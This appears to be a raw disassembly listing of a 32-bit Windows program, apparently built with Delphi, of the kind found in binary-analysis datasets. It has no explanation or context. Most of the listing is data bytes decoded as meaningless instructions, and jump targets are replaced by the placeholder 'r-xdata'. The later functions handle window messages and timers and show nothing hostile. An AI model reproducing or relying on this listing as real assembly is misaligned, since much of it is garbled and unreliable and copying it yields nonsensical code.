jae r-xdata
pop es
dec ecx
outsb
je r-xdata
outsd
insb
add [ esp + eax * 2 ] eax
or [ ebp + 0x78 ] al
bound esi [ eax + 0x6f ]
inc esi
jb r-xdata
je r-xdata
add [ eax + 0x3e8 ] al
add eax [ eax ]
or [ ecx + 0x6e ] cl
inc eax
add [ eax ] dh
add [ eax ] al
jmp [ eax - 0x31 ]
jb r-xdata
inc ebp
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax + edx ] bh
inc eax
add [ eax + edx ] bh
inc eax
add [ ecx + eax * 8 + 0xe080042 ] ah
push esp
inc edx
popad
outsb
dec ebp
outsd
jbe r-xdata
outsb
je r-xdata
push edx
arpl [ gs : ebp + eax + 0x54 ] si
jb r-xdata
jb r-xdata
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] al
inc eax
add [ eax ] bl
mov ch 0x43
add [ eax ] al
adc [ eax ] al
nop
arpl [ gs : eax + ecx + 0x7 ] si
je r-xdata
jb r-xdata
inc esp
je r-xdata
insd
or [ gs : ebp + 0x78 ] al
or [ edi ] al
inc ebx
outsd
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x7 ] si
arpl [ gs : eax + ecx + 0x7 ] si
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
inc ebp
jbe r-xdata
add eax 0x65530608
outsb
add eax 0x65530608
outsb
jb r-xdata
push edx
outsd
ja r-xdata
or [ edx + 0x6f ] dl
push edx
arpl [ gs : eax + eax + 0x4 ] si
adc [ eax ] eax
sbb [ ebp + 0x43 ] dh
arpl [ ebp + eax + 0x54 ] si
push ebx
imul edi [ edx + 0x65 ] 0x746e4907
jb r-xdata
jb r-xdata
outsd
insb
and cl al
inc edx
add [ eax ] cl
push cs
push esp
inc edx
popad
outsb
dec ecx
outsb
insb
jb r-xdata
outsd
insb
or [ ebx + eax * 2 + 0x6f ] dl
outsb
je r-xdata
add ecx [ eax ]
push es
push ebx
outsb
jb r-xdata
loopne r-xdata
outsd
insb
or [ ebx + eax * 2 + 0x6f ] dl
outsb
je r-xdata
arpl [ eax + ecx + 0x7 ] si
push 0x65
outsb
je r-xdata
inc ebx
outsd
outsb
je r-xdata
or [ edi ] al
push 0x65
outsd
jne r-xdata
inc ebx
outsd
outsb
je r-xdata
or [ edi ] al
arpl [ eax + ecx + 0x7 ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
outsd
insb
adc [ esi ] eax
dec ecx
outsb
jae r-xdata
inc ebx
outsd
outsb
je r-xdata
or [ edi ] al
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x7 ] si
push eax
popad
imul ebp [ esi + 0x74 ] 0x6974704f
outsd
outsb
jae r-xdata
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
les eax [ edx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
insb
or [ esi ] al
inc ebx
popad
outsb
jbe r-xdata
add ecx [ eax ]
push es
push ebx
outsb
inc ecx
push edx
arpl [ gs : ebp + eax + 0x54 ] si
outsd
add [ eax ] al
mov eax eax
clc
rol [ edx ] 0x8
je r-xdata
je r-xdata
add al 0x11
inc eax
add [ eax ] bl
mov ch 0x43
add [ eax + 0x5 ] cl
inc edx
add [ eax ] al
add [ eax ] al
add [ eax + eax * 8 - 0x3f74ffbe ] ch
add dl 0x42
add [ ecx ] al
or [ edx + edx * 2 + 0x6f ] dl
ja r-xdata
retn 0x42
jae r-xdata
add al al
xor eax [ eax ]
pushfd
out 0x41 eax
add al cl
xor eax [ eax ]
inc esp
aas
inc esp
add [ ecx + esi ] al
inc eax
add [ eax ] ah
xor [ eax ] eax
sub cl dl
inc edx
add [ edi + ebp * 2 ] ah
imul ebp [ edi + 0x6e ] 0x42541173
popad
outsb
dec edi
jo r-xdata
arpl [ ecx + eax + 0x7 ] si
outsd
insb
adc [ 0x63655241 ] eax
je r-xdata
add [ ecx + edx ] al
dec ecx
outsb
je r-xdata
or [ ebx + eax * 2 + 0x6f ] dl
outsb
je r-xdata
add eax 0x63655254
je r-xdata
inc esp
add [ edi + esi ] cl
inc esp
add [ eax - 0x5fffbe7c ] ch
sbb al 0x44
add [ eax - 0x3fffbc10 ] al
and eax [ eax + eax - 0x68 ]
stc
inc ebx
add [ eax - 0x12 ] ah
inc ecx
add [ eax - 0x15 ] cl
inc ecx
add [ eax - 0x15 ] al
inc ecx
add [ eax - 0x12 ] ch
inc ecx
add [ eax + edx * 8 + 0x42 ] bl
add [ eax ] bh
push 0x44
add [ eax ] ch
loop r-xdata
inc eax
add [ eax ] ch
rol [ edx ] 0x1
and al 0x6f
imul edi [ edx + 0x65 ] 0x105
add bh bh
adc [ 0x63655241 ] eax
push esp
inc ebx
popad
outsb
jbe r-xdata
pop ds
inc esp
add [ edx + 0x63400044 ] al
inc esp
add [ esi + ebx * 2 ] bh
inc esp
add [ ebx ] ah
inc esp
add [ eax ] bh
and al 0x44
add ah ch
rol [ edx ] 0x1
insb
cmp [ eax + eax - 0x60 ] al
rol [ edx ] 0x1
push esp
xor eax 0x33840044
inc esp
add [ ecx + edi ] al
inc esp
add [ eax ] cl
cmp [ eax + eax - 0x40 ] eax
aaa
inc esp
add [ eax + 0x37 ] ch
inc esp
add [ esp + 0x44 ] ah
add [ eax + 0x14004481 ] al
jbe r-xdata
add [ eax - 0xbffbb92 ] ah
out dx al
inc ebx
add al bh
inc esp
add [ eax ] bl
inc esp
add [ eax ] dh
bound eax [ eax + eax + 0x3c ]
out dx al
inc ebx
add [ eax - 0x12 ] al
inc ebx
add [ eax + 0x1e ] dh
inc esp
add [ esi + ebx - 0x67fffbc ] bl
inc ebx
add [ eax + 0xc0043ef ] bh
sti
inc ebx
add [ edx + edi * 8 - 0x267ffbd ] al
inc ebx
add [ esp + edi * 8 + 0x43 ] al
add al ah
cmp eax 0x1f200044
andps xmm0 [ edx + 0x61 ]
outsb
push eax
popad
imul ebp [ esi + 0x74 ] 0x6e657645
je r-xdata
add [ ecx + edx ] al
inc eax
add [ eax ] bl
mov ch 0x43
push esp
add [ eax ] al
add [ eax ] al
add [ ebx + 0x42c1f8c0 ] cl
add [ eax ] cl
jb r-xdata
push eax
jb r-xdata
or eax 0x66657250
jb r-xdata
add [ edi ] eax
push edx
arpl [ gs : ecx + eax + 0x7 ] si
push esp
jae r-xdata
add [ ebx + ebp * 8 - 0xdc3ffbe ] dh
inc edx
add [ edi + ebp * 8 - 0xf4bffbe ] cl
inc edx
add [ eax + esi * 8 ] bl
inc edx
add [ esp + ebp * 8 - 0x1257ffbe ] bl
inc edx
add [ esi + ebp * 8 - 0x1e93ffbe ] bl
inc edx
add [ ecx ] dl
push esp
inc ebx
jne r-xdata
add al ah
pushad
inc esp
add al dl
arpl [ eax + eax - 0x5c ] ax
jmp 0xfffffffff0a6c3f0
inc eax
add [ eax ] bl
mov ch 0x43
add al 0x11
jb r-xdata
je r-xdata
add eax 0x63655241
enter 0x4033 0x0
je r-xdata
insb
pop ds
inc esp
add [ edx + 0x63400044 ] al
inc esp
add [ esi + ebx * 2 ] bh
inc esp
add [ ebx ] ah
inc esp
add [ eax ] bh
and al 0x44
add ah ch
rol [ edx ] 0x1
insb
cmp [ eax + eax - 0x60 ] al
rol [ edx ] 0x1
push esp
xor eax 0x33840044
inc esp
add [ ecx + edi ] al
inc esp
add [ eax ] cl
cmp [ eax + eax - 0x40 ] eax
aaa
inc esp
add [ eax + 0x37 ] ch
inc esp
add [ esp + 0x44 ] ah
add [ eax + 0x14004481 ] al
jbe r-xdata
add [ eax - 0xbffbb92 ] ah
out dx al
inc ebx
add al bh
inc esp
add [ eax ] bl
inc esp
add [ eax ] dh
bound eax [ eax + eax + 0x3c ]
out dx al
inc ebx
add [ eax - 0x12 ] al
inc ebx
add [ eax + 0x1e ] dh
inc esp
add [ esi + ebx - 0x67fffbc ] bl
inc ebx
add [ eax + 0xc0043ef ] bh
sti
inc ebx
add [ edx + edi * 8 - 0x267ffbd ] al
inc ebx
add [ esp + edi * 8 + 0x43 ] al
add al ah
cmp eax 0x1f200044
inc esp
inc ecx
add al cl
xor eax [ eax ]
insd
inc ebx
outsd
outsb
je r-xdata
inc edx
add [ esp + eax * 8 ] bl
inc edx
add [ eax + eax + 0x8 ] al
inc ebp
js r-xdata
add al ah
pushad
inc esp
add al dl
arpl [ eax + eax - 0x5c ] ax
jmp 0xfffffffff0a6c5a4
add [ ecx + esi ] al
inc eax
add [ eax ] ah
xor [ eax ] eax
sub cl dl
inc edx
add [ edi + ebp * 2 ] ah
inc esp
add [ edi + esi ] cl
inc esp
outsd
adc [ edx ] eax
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
inc ebx
je r-xdata
inc esp
add [ ecx + ebp * 8 - 0xf9bffbe ] ah
inc edx
add [ eax + esi * 8 - 0x10bfffbe ] al
inc edx
add [ eax + ebp * 8 + 0x42 ] ah
add [ ecx + ebp * 8 ] ah
inc edx
add [ eax - 0x1f ] dh
inc edx
add [ ebx ] cl
add [ eax + esi * 4 ] ch
sbb al 0xb0
add [ ebp - 0x3bffec ] bh
xlat
shl [ eax ] 0xc4
inc edx
add [ edi ] al
adc [ ebx + eax * 2 + 0x75 ] edx
jae r-xdata
inc ebx
add [ ecx + eax ] ah
outsd
inc esp
jb r-xdata
push cs
add [ eax ] cl
inc ecx
jne r-xdata
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
insb
jae r-xdata
add [ eax - 0x5fffbe7c ] ch
sbb al 0x44
add [ eax - 0x3fffbc10 ] al
and eax [ eax + eax - 0x68 ]
stc
inc ebx
add [ eax - 0x12 ] ah
inc ecx
add [ eax - 0x15 ] cl
inc ecx
add [ eax - 0x15 ] al
inc ecx
add [ eax - 0x12 ] ch
inc ecx
add [ eax + edx * 8 + 0x42 ] bl
add [ eax ] bh
push 0x44
add [ eax ] ch
loop r-xdata
outsd
insd
inc ebx
outsd
outsb
je r-xdata
adc [ eax ] eax
or al [ edx + 0x65 ]
jbe r-xdata
add [ bx + si ] dl
inc eax
add [ eax + eax ] bl
[ eax + eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
str [ eax ]
inc ecx
jne r-xdata
or al 0x0
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
add [ eax - 0x5e ] cl
inc ebx
add [ ebx ] bl
add bh bh
mov al [ 0xffffffff8000441c ]
outsd
insb
inc edx
popad
jb r-xdata
add [ eax ] al
adc al 0x0
or al [ edx + 0x65 ]
jbe r-xdata
insb
dec ecx
outsb
outsb
jb r-xdata
test al 0xb8
inc ebx
add [ ebp + 0x1 ] ah
outsd
push ebx
imul edi [ edx + 0x65 ] r-xdata
bound eax [ ecx ]
add bh bh
jno r-xdata
inc esp
add [ eax ] dl
inc eax
add [ edx ] dl
add al [ eax ]
call [ edx ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or eax 0x75410800
je r-xdata
jb r-xdata
retn 0x42
add [ ebx ] cl
inc ebx
outsd
outsb
jae r-xdata
insb
push edi
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
insb
add [ eax ] eax
push [ eax + 0x65 ]
jmp [ eax ]
add [ eax ] eax
mov eax 0x1640043
add bh bh
and [ ecx + 0x44 ] dh
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ edx ] dl
add [ edx ] cl
inc edx
jbe r-xdata
add bh bh
jo r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc eax [ eax ]
or [ edx + 0x65 ] eax
jbe r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ edi ] 0x0
add [ eax ] al
add [ eax ] al
add [ ebx ] dl
add [ ecx ] cl
inc edx
jbe r-xdata
insb
inc ebp
jae r-xdata
add al 0xb8
inc ebx
add [ ebx + 0x1 ] ah
inc esp
outsd
arpl [ ebx ] bp
adc [ eax ] al
adc [ edx ] eax
add bh bh
aas
inc esp
insb
inc edx
popad
jb r-xdata
add [ ebp ] bl
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb eax [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebp
outsd
add [ gs : eax ] dl
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
inc [ eax ]
sbb al 0x44
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb al 0x0
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
add [ eax ] dl
inc eax
add [ esi + esi * 2 ] cl
jb r-xdata
add [ eax ] bl
add [ eax ] cl
inc esp
outsd
arpl [ ebx + 0x53 ] bp
imul esi [ ebp + 0x30 ] 0x7a0043a2
add [ eax ] al
jb r-xdata
add [ eax ] al
adc eax 0x6f420b00
jb r-xdata
insb
dec edi
jne r-xdata
add [ eax + 0x2cff0001 ] ch
push eax
inc esp
add [ ecx ] al
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ esi ] 0x0
add eax 0x6f6c6f43
insb
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
push 0xb4ff0001
jno r-xdata
add [ eax ] eax
jmp [ eax ]
add bh bh
and [ ecx + 0x44 ] dh
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ ecx ] dl
add [ edx ] cl
inc edx
jbe r-xdata
mov eax 0x1630043
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and [ eax ] al
or dl [ eax + 0x61 ]
outsb
je r-xdata
add [ eax ] al
add [ edx ] bl
add [ eax ] cl
inc esp
jb r-xdata
imul ebp [ esi + 0x74 ] 0x40100073
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb [ eax ] al
or [ edi + ebp * 2 + 0x63 ] al
imul edx [ ebx + 0x69 ] 0x74
xor [ gs : edx + 0x7a0043 ] ah
add bh bh
jpe r-xdata
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
jb r-xdata
add [ eax ] dh
jb r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
sbb [ eax ] eax
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
stosb [ edi ]
inc ebx
add [ eax + eax ] dh
jo r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ eax + 0x50090023 ] al
outsb
add [ ecx ] 0x0
add [ eax ] al
pop ds
add [ ebx ] cl
push eax
popad
jb r-xdata
popad
arpl [ ebx + 0x67 ] bp
jb r-xdata
jb r-xdata
add [ 0x61501000 ] bl
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
add bh bh
push eax
std
inc ebx
add [ ebp + edi * 8 + 0x43 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050016 ] al
outsd
insb
outsd
adc [ eax ] al
or al [ edx + 0x65 ]
jbe r-xdata
add bh bh
xchg esp eax
jno r-xdata
mov eax 0x1650043
add [ eax + eax + 0x1fe00 ] bh
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
sbb eax 0x61501000
jae r-xdata
inc sp
jo r-xdata
pop es
push eax
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
and al [ eax ]
outsb
je r-xdata
je r-xdata
jne r-xdata
inc esp
jb r-xdata
add bh bh
add ch bh
outsb
jne r-xdata
adc [ eax ] al
0x24ff0000 0x43fd
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push cs
push eax
popad
jb r-xdata
je r-xdata
inc esi
add [ fs : eax ] dl
inc eax
add [ edx ] bl
add bh bh
je r-xdata
add [ eax ] al
test al 0x43
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb al [ eax ]
or [ edx + esi * 2 + 0x61 ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
test eax 0x65ec0043
inc esp
add [ esi + 0x44 ] ch
retn 0x42
add [ eax ] al
add [ eax + eax ] ah
outsb
je r-xdata
imul esp [ ebx + 0x74 ] 0xb8657275
out dx eax
inc esp
add [ eax + eax ] bh
[ eax - 0x5 ]
xor eax [ eax + eax + 0x10 ]
inc eax
add [ ecx ] bl
add bh bh
fdiv st4
inc ebx
add [ ecx ] al
push [ ebp + edi * 8 + 0x43 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push ds
add [ ebx ] cl
push eax
popad
jb r-xdata
inc ebx
imul edi [ edx + 0x65 ] r-xdata
xor al 0x2
add bh bh
pop esp
loope r-xdata
add bh bh
dec esp
loope r-xdata
push 0x6948776f
outsb
je r-xdata
add [ ecx ] 0x0
add [ eax ] al
and [ eax ] eax
outsb
je r-xdata
insb
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and eax 0x6f520700
ja r-xdata
inc ebx
add al cl
cld
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53080026 ] al
push 0x6948776f
outsb
je r-xdata
std
pop es
push edx
outsd
ja r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb [ edx ] 0x0
add [ eax ] al
and al 0x0
outsd
jo r-xdata
push eax
or [ edx ] al
sub al 0x2
add bh bh
shl al 0x1
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50070022 ] al
jb r-xdata
add [ edx ] cl
push eax
popad
outsd
insb
outsd
jb r-xdata
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sub [ eax ] al
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
outsb
popad
jo r-xdata
adc [ eax ] al
test eax 0xc0ff0001
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
push edi
add [ eax ] al
call eax
cli
inc ebx
add [ eax + 0x1c ] ah
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sub [ eax ] eax
pop es
push esi
imul esi [ ebx + 0x69 ] 0xc8656c62
rol [ edx ] 0x38
add al [ eax ]
adc [ eax ] al
cdq
add [ eax ] al
inc [ eax ]
sub_42ce18
push ebx
push esi
call sub_4034f8
mov ebx edx
mov esi eax
mov [ esi + 0x40 ] 0x0
mov eax esi
call sub_42cec4
mov eax [ esi + 0x34 ]
call sub_41f8d8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41e724
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034e0
sub_42ce50
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov esi [ ebx ]
cmp esi 0x113
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
push eax
call DefWindowProcA
mov [ ebx + 0xc ] eax
xor eax eax
push ebp
push sub_42ce8a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_403368
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42cec4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_42cf43
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
mov eax [ ebx + 0x34 ]
push eax
call KillTimer
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42cf4a
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
cmp [ ebx + 0x40 ] 0x0
je r-xdata
cmp [ ebx + 0x3a ] 0x0
je r-xdata
push 0x0
push esi
push 0x1
mov eax [ ebx + 0x34 ]
push eax
call SetTimer
test eax eax
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9cc
call sub_4038f8
sub_42cf9c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov ebx edx
mov edi eax
mov esi [ ebp + 0x1c ]
mov eax 0x48
call sub_4026dc
mov [ eax ] edi
mov edx [ ebp + 0xc ]
push esi
mov esi edx
lea edi [ eax + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov dl [ ebp - 0x1 ]
mov [ eax + 0x14 ] dl
mov [ eax + 0x15 ] bl
mov edx [ esi ]
mov [ eax + 0x16 ] edx
mov edx [ esi + 0x4 ]
mov [ eax + 0x1a ] edx
mov edx [ ebp + 0x18 ]
mov [ eax + 0x20 ] edx
mov edx [ ebp + 0x14 ]
mov [ eax + 0x24 ] edx
mov edx [ ebp + 0x8 ]
mov [ eax + 0x28 ] edx
mov [ eax + 0x2c ] 0x1
mov [ eax + 0x38 ] bl
mov edx [ esi ]
mov [ eax + 0x39 ] edx
mov edx [ esi + 0x4 ]
mov [ eax + 0x3d ] edx
mov edx [ ebp + 0x18 ]
mov [ eax + 0x44 ] edx
mov edx [ ebp + 0x10 ]
mov [ eax + 0x30 ] edx
xor edx edx
mov [ eax + 0x34 ] edx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x18
sub_42d01c
push ebx
push esi
push edi
mov ebx edx
mov edi eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov esi ebx
mov edx ebx
mov eax edi
call sub_418030
mov ebx [ ebx + 0x34 ]
mov eax esi
call sub_4026fc
test ebx ebx
jne r-xdata
sub_42d05c
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_4480d4
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov edx 0x64
mov eax ebx
call sub_43f36c
mov edx 0x32
mov eax ebx
call sub_43f390
mov [ ebx + 0x211 ] 0x1
mov [ ebx + 0x212 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov [ ebx + 0x228 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4247dc
mov esi eax
mov [ ebx + 0x22c ] esi
mov [ esi + 0x14 ] ebx
mov [ esi + 0x10 ] sub_42f178
mov [ ebx + 0x230 ] 0x1a
mov [ ebx + 0x234 ] 0x1
mov dl 0x1
mov eax ebx
call sub_447194
mov [ ebx + 0x1f8 ] 0x1
mov dl 0x1
mov eax ebx
call sub_44502c
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403490
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_42d128
push ebx
push esi
push edi
push ebp
call sub_4034f8
mov ebx edx
mov ebp eax
mov eax [ ebp + 0x228 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebp + 0x228 ]
call sub_40316c
mov eax [ ebp + 0x22c ]
call sub_40316c
mov edx ebx
and dl 0xfc
mov eax ebp
call sub_448130
test bl bl
jle r-xdata
inc edi
xor esi esi
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_4034e0
inc esi
dec edi
jne r-xdata
mov eax [ ebp + 0x228 ]
mov edx esi
call sub_417e94
call sub_4026fc
mov eax [ ebp + 0x228 ]
mov edx esi
call sub_417e94
test eax eax
je r-xdata
sub_42d1b0
push ebp
mov ebp esp
push ebx
push esi
cmp [ eax + 0x30 ] 0x0
je r-xdata
xor eax eax
mov ebx [ edx ]
mov esi [ eax + 0x30 ]
cmp ebx [ esi + 0x39 ]
jne r-xdata
mov eax [ eax + 0x30 ]
cmp ecx [ esi + 0x44 ]
je r-xdata
mov ebx [ edx ]
mov [ eax + 0x39 ] ebx
mov [ eax + 0x44 ] ecx
mov ebx [ ebp + 0x8 ]
mov [ ebx - 0x4 ] eax
mov eax [ eax + 0x30 ]
test eax eax
jne r-xdata
mov al 0x1
jmp r-xdata
pop esi
pop ebx
pop ebp
retn
sub_42d1ec
push ebp
mov ebp esp
add esp 0xffffff50
push ebx
push esi
push edi
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x210 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov [ eax + 0x210 ] 0x1
xor edx edx
push ebp
push sub_42dd1d
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_42dd8c
mov [ ebp - 0x55 ] al
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x228 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
mov [ ebp - 0x4c ] eax
xor eax eax
mov [ ebp - 0x50 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x228 ]
mov eax [ eax + 0x8 ]
dec eax
mov [ ebp - 0x54 ] eax
mov eax [ ebp - 0x50 ]
mov edx [ ebp - 0x54 ]
sub edx eax
jl r-xdata
call sub_4039a4
jmp r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x6d ] 0x0
mov [ ebp - 0x6c ] 0x2
inc edx
mov [ ebp - 0x74 ] edx
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x6c ] 0x0
jne r-xdata
mov [ ebp - 0x6d ] 0x1
dec [ ebp - 0x6c ]
inc [ ebp - 0x14 ]
dec [ ebp - 0x74 ]
jne r-xdata
inc [ ebp - 0x4c ]
xor eax eax
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x48 ] 0x1
mov eax [ ebp - 0x48 ]
cmp eax [ ebp - 0x4c ]
jg r-xdata
call sub_4039a4
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x228 ]
mov edx [ ebp - 0x14 ]
call sub_417e94
mov ebx eax
mov al [ ebx + 0x15 ]
mov [ ebx + 0x38 ] al
cmp [ ebx + 0x15 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x48 ] 0x1
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x228 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
cmp [ ebp - 0x48 ] 0x1
jne r-xdata
xor eax eax
mov [ ebp - 0x2c ] eax
cmp [ ebp - 0x56 ] 0x0
jne r-xdata
inc eax
mov [ ebp - 0x74 ] eax
mov [ ebp - 0x14 ] 0x0
mov eax [ ebp - 0x54 ]
inc eax
mov [ ebp - 0x50 ] eax
xor eax eax
mov [ ebp - 0x50 ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x7c ]
cmp [ ebp - 0xc ] 0x0
je r-xdata
inc [ ebp - 0x14 ]
dec [ ebp - 0x74 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x10 ]
sub eax [ edx ]
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x50 ]
mov edx [ ebp - 0x54 ]
sub edx eax
jl r-xdata
inc edx
mov [ ebp - 0x74 ] edx
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x228 ]
mov eax [ eax + 0x8 ]
dec eax
mov [ ebp - 0x54 ] eax
mov eax [ ebp - 0x50 ]
mov edx [ ebp - 0x54 ]
dec edx
sub edx eax
jl r-xdata
mov eax [ ebp - 0x8 ]
mov si 0xffee
call sub_403368
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0x210 ] 0x0
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x228 ]
mov edx [ ebp - 0x14 ]
call sub_417e94
mov ebx eax
